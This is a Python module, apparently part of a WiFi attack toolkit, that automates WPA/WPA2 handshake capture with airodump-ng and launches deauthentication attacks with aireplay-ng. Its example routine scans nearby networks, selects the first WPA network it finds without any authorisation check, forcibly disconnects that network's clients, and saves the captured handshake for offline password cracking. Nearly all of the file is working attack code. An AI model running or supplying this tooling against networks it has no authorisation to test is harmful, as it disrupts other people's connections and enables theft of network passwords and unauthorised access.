# -*- coding: utf-8 -*-
"""Handles WPA/WPA2 handshake capture using airodump-ng and aireplay-ng."""

import subprocess
import time
import os
import signal
import re

# Define global variables for processes
airodump_capture_process = None
aireplay_deauth_process = None

def run_command(command, capture=True):
    """Executes a shell command (simplified)."""
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=capture, text=True, encoding="utf-8")
        return result.stdout.strip() if capture else "", result.stderr.strip() if capture else ""
    except subprocess.CalledProcessError as e:
        stderr_output = e.stderr.strip() if capture else "Process failed"
        # print(f"[!] Error executing command: {command}")
        # print(f"[!] Stderr: {stderr_output}")
        return None, stderr_output
    except FileNotFoundError:
        return None, "Command not found"

def start_handshake_capture(monitor_interface, target_bssid, target_channel, output_prefix):
    """Starts airodump-ng specifically to capture handshakes for a target AP."""
    global airodump_capture_process

    if airodump_capture_process and airodump_capture_process.poll() is None:
        print("[!] An airodump-ng capture process is already running.")
        return None, None

    # Ensure the output directory exists
    output_dir = os.path.dirname(output_prefix)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Clean up previous capture files with the same prefix
    # Airodump adds -01, -02 etc. We only care about the .cap file here.
    base_name = os.path.basename(output_prefix)
    files_to_remove = [f for f in os.listdir(output_dir if output_dir else ".") if f.startswith(base_name) and f.endswith(".cap")]
    for f in files_to_remove:
        try:
            os.remove(os.path.join(output_dir if output_dir else ".", f))
        except OSError:
            pass

    # Construct the airodump-ng command
    # --bssid: Filter for the target AP
    # --channel: Focus on the target channel
    # --write: Save captured packets (including handshake)
    # --output-format pcap: Ensure .cap file is created
    command = f"airodump-ng --bssid {target_bssid} --channel {target_channel} --write {output_prefix} --output-format pcap {monitor_interface}"

    print(f"[*] Starting handshake capture: {command}")
    try:
        # Use Popen to run in the background
        # Capture stderr to check for errors or handshake detection messages
        airodump_capture_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding="utf-8", errors="ignore", preexec_fn=os.setsid)
        print(f"[+] Airodump-ng capture started (PID: {airodump_capture_process.pid}). Waiting for handshake...")
        # Give it a moment to start
        time.sleep(2)
        capture_file = f"{output_prefix}-01.cap" # Default name airodump uses
        return airodump_capture_process, capture_file
    except Exception as e:
        print(f"[!] Failed to start airodump-ng for capture: {e}")
        airodump_capture_process = None
        return None, None

def stop_process(process, name="process"):
    """Stops a running process group."""
    if process and process.poll() is None:
        print(f"[*] Stopping {name} (PID: {process.pid})...")
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            process.wait(timeout=3)
            print(f"[+] {name} stopped.")
        except ProcessLookupError:
            print(f"[!] {name} already terminated.")
        except subprocess.TimeoutExpired:
            print(f"[!] {name} did not terminate gracefully, sending SIGKILL...")
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except Exception as kill_err:
                 print(f"[!] Error sending SIGKILL to {name}: {kill_err}")
        except Exception as e:
            print(f"[!] Error stopping {name}: {e}")
        finally:
            process = None # Ensure process variable is cleared
    # else:
        # print(f"[*] No active {name} found to stop.")
    return None # Return None to clear the global variable

def stop_handshake_capture():
    """Stops the running airodump-ng capture process."""
    global airodump_capture_process
    airodump_capture_process = stop_process(airodump_capture_process, "airodump-ng capture")

def start_deauth_attack(monitor_interface, target_bssid, client_mac="FF:FF:FF:FF:FF:FF", packets=0):
    """Starts aireplay-ng deauthentication attack."""
    global aireplay_deauth_process

    if aireplay_deauth_process and aireplay_deauth_process.poll() is None:
        print("[!] An aireplay-ng deauth process is already running.")
        return None

    # Construct the aireplay-ng command
    # -0: Deauthentication attack
    # <packets>: Number of deauth packets to send (0 means continuous)
    # -a <bssid>: Target AP BSSID
    # -c <client_mac>: Target client MAC (optional, FF:FF:FF:FF:FF:FF for broadcast)
    command = f"aireplay-ng -0 {packets} -a {target_bssid}"
    if client_mac and client_mac.upper() != "FF:FF:FF:FF:FF:FF":
        command += f" -c {client_mac}"
    command += f" {monitor_interface}"

    print(f"[*] Starting deauthentication attack: {command}")
    try:
        # Use Popen to run in the background
        aireplay_deauth_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        print(f"[+] Aireplay-ng deauth started (PID: {aireplay_deauth_process.pid}).")
        return aireplay_deauth_process
    except Exception as e:
        print(f"[!] Failed to start aireplay-ng deauth: {e}")
        aireplay_deauth_process = None
        return None

def stop_deauth_attack():
    """Stops the running aireplay-ng deauth process."""
    global aireplay_deauth_process
    aireplay_deauth_process = stop_process(aireplay_deauth_process, "aireplay-ng deauth")

def check_for_handshake_in_output(process):
    """Checks the stderr of the airodump process for handshake messages."""
    if not process or process.poll() is not None:
        return False
    try:
        # Non-blocking read of stderr
        for line in iter(process.stderr.readline, ""): # Read line by line
            if not line: # No more output currently
                 break
            # print(f"DEBUG Airodump stderr: {line.strip()}") # Uncomment for debugging
            if "WPA handshake:" in line:
                print(f"[+] Detected Handshake in airodump output: {line.strip()}")
                return True
    except Exception as e:
        # Handle exceptions if the process terminates unexpectedly during read
        # print(f"[!] Error reading airodump stderr: {e}")
        pass
    return False

def check_handshake_in_file(capture_file, target_bssid, target_essid=None):
    """Uses aircrack-ng or pyrit to verify handshake in the capture file."""
    if not os.path.exists(capture_file):
        return False

    # Method 1: Using aircrack-ng (often reliable)
    print(f"[*] Verifying handshake in {capture_file} using aircrack-ng...")
    command_aircrack = f"aircrack-ng {capture_file}"
    stdout, stderr = run_command(command_aircrack)

    if stdout:
        # Search for lines indicating a handshake for the target BSSID
        # Example output: "1 handshake(s) found for (ESSID) (BSSID). Use -e/-b to specify." or specific lines with BSSID
        handshake_found = False
        lines = stdout.splitlines()
        for i, line in enumerate(lines):
            if target_bssid.lower() in line.lower(): # Found the BSSID line
                 # Check this line or the next few lines for handshake indication
                 if "WPA" in line and ("1 handshake" in line or "handshake" in lines[min(i+1, len(lines)-1)]): # Basic check
                      handshake_found = True
                      break
                 # More robust check might be needed depending on aircrack version

        if handshake_found:
             print(f"[+] Aircrack-ng confirmed handshake for {target_bssid} in {capture_file}")
             return True
        else:
             # Check summary line if specific BSSID line didn't confirm
             if f"WPA ({target_bssid})" in stdout or f"WPA (1 handshake)" in stdout: # Less precise check
                  if target_essid and target_essid in stdout: # Try to correlate with ESSID if available
                       print(f"[+] Aircrack-ng likely confirmed handshake for {target_bssid} ({target_essid}) in {capture_file}")
                       return True

    # Fallback or alternative: Using pyrit (if installed)
    # print(f"[*] Verifying handshake in {capture_file} using pyrit...")
    # command_pyrit = f"pyrit -r {capture_file} analyze"
    # stdout_pyrit, stderr_pyrit = run_command(command_pyrit)
    # if stdout_pyrit and f"#{target_bssid}" in stdout_pyrit and "handshake" in stdout_pyrit:
    #     print(f"[+] Pyrit confirmed handshake for {target_bssid} in {capture_file}")
    #     return True

    print(f"[-] Handshake for {target_bssid} not definitively confirmed in {capture_file} by checker.")
    return False


if __name__ == "__main__":
    # Example Usage (requires root, monitor interface, and target AP details)
    try:
        from interface_manager import get_wireless_interfaces, enable_monitor_mode, disable_monitor_mode
        from scanner import start_airodump_scan, stop_airodump_scan, parse_airodump_csv
    except ImportError:
        print("[!] Failed to import required modules. Make sure they are accessible.")
        exit(1)

    # --- Configuration ---
    SCAN_DURATION = 15 # seconds
    CAPTURE_TIMEOUT = 60 # seconds
    DEAUTH_PACKETS = 5 # Send a burst of deauth packets
    OUTPUT_DIR = "/home/ubuntu/captures"
    # --- End Configuration ---

    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    interfaces = get_wireless_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        exit(1)
    selected_interface = interfaces[0]

    print(f"[*] Using interface: {selected_interface}")
    monitor_iface = enable_monitor_mode(selected_interface)
    if not monitor_iface:
        print("[!] Failed to enable monitor mode.")
        exit(1)

    # 1. Scan for targets
    print(f"[*] Scanning for networks for {SCAN_DURATION} seconds...")
    scan_prefix = os.path.join(OUTPUT_DIR, "nearby_scan")
    scan_proc, scan_csv = start_airodump_scan(monitor_iface, output_prefix=scan_prefix)
    target_ap = None
    if scan_proc and scan_csv:
        time.sleep(SCAN_DURATION)
        stop_airodump_scan()
        aps, _ = parse_airodump_csv(scan_csv)
        if aps:
            print("[*] Available WPA/WPA2 Networks:")
            wpa_aps = [ap for ap in aps if "WPA" in ap["privacy"]]
            for i, ap in enumerate(wpa_aps):
                print(f"  {i}: {ap['essid']} ({ap['bssid']}) - Ch: {ap['channel']}, Enc: {ap['privacy']}")
            if wpa_aps:
                # Select the first WPA network for testing
                target_ap = wpa_aps[0]
                print(f"\n[*] Selecting target: {target_ap['essid']} ({target_ap['bssid']}) on Ch: {target_ap['channel']}")
            else:
                print("[!] No WPA/WPA2 networks found in scan.")
        else:
            print("[!] No networks found in scan.")
        # Clean up scan files
        for ext in [".csv", ".cap", ".kismet.csv", ".kismet.netxml", ".log.csv"]:
            try: os.remove(f"{scan_prefix}-01{ext}")
            except OSError: pass
    else:
        print("[!] Failed to start initial scan.")

    # 2. Capture Handshake if target found
    if target_ap:
        capture_prefix = os.path.join(OUTPUT_DIR, f"handshake_{target_ap['bssid'].replace(':', '')}")
        cap_proc, cap_file = start_handshake_capture(monitor_iface, target_ap["bssid"], target_ap["channel"], capture_prefix)

        if cap_proc and cap_file:
            handshake_found = False
            start_time = time.time()

            # Start deauth periodically
            deauth_proc = start_deauth_attack(monitor_iface, target_ap["bssid"], packets=DEAUTH_PACKETS)

            print(f"[*] Monitoring for handshake for {CAPTURE_TIMEOUT} seconds...")
            while time.time() - start_time < CAPTURE_TIMEOUT:
                # Check airodump output first (quickest check)
                if check_for_handshake_in_output(cap_proc):
                    handshake_found = True
                    print("[+] Handshake detected in airodump output!")
                    break

                # Periodically check the .cap file as a fallback
                if int(time.time() - start_time) % 10 == 0: # Check every 10 seconds
                     if check_handshake_in_file(cap_file, target_ap["bssid"], target_ap["essid"]):
                          handshake_found = True
                          print("[+] Handshake verified in capture file!")
                          break

                time.sleep(1) # Check every second

            # Stop processes
            stop_handshake_capture()
            stop_deauth_attack()

            if handshake_found:
                print(f"\n[+] Handshake capture successful! File saved to: {cap_file}")
                # Final verification
                check_handshake_in_file(cap_file, target_ap["bssid"], target_ap["essid"])
            else:
                print(f"\n[-] Handshake not captured within the timeout ({CAPTURE_TIMEOUT}s). Capture file (may be incomplete): {cap_file}")
                # Keep the capture file even if handshake wasn't confirmed
        else:
            print("[!] Failed to start handshake capture process.")

    # Disable monitor mode
    disable_monitor_mode(monitor_iface)
    print("[*] Example finished.")

